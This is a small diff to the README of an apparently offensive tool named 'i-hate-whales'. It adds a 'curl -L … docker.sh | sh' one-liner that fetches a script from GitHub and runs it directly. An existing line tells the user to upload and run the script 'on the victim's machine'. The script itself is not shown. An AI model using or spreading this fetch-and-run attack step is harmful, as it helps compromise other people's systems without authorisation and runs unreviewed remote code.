@@ -23,6 +23,12 @@ cd i-hate-whales
 bash docker.sh
 ```
 
+or
+```
+curl -L https://raw.githubusercontent.com/march0s1as/i-hate-whales/main/docker.sh | sh
+```
+
+
 on the victim's machine, just upload the docker.sh and run it.
 
 <br>
